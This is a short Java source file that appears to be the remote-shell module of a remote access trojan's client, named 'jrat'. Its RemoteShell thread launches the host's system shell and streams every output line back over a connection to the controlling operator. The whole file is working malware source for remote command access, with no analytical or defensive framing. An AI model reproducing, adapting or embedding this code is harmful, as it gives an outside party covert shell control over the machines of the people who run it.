package jrat.module.shell;

import jrat.client.Connection;
import jrat.module.shell.packets.Packet21RemoteShell;
import oslib.Shell;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class RemoteShell extends Thread {

	private static Process p;
	
	private Connection con;
	
	public RemoteShell(Connection con) {
		this.con = con;
	}

	public void run() {
		String line;
		try {

			String shell = Shell.getShell().getPath();

			ProcessBuilder builder = new ProcessBuilder(shell);
			builder.redirectErrorStream(true);
			p = builder.start();

			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					con.addToSendQueue(new Packet21RemoteShell(line));
				}
			}
			input.close();
		} catch (Exception ex) {
			ex.printStackTrace();
			con.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}
	
	public static Process getInstance() {
		return p;
	}

}
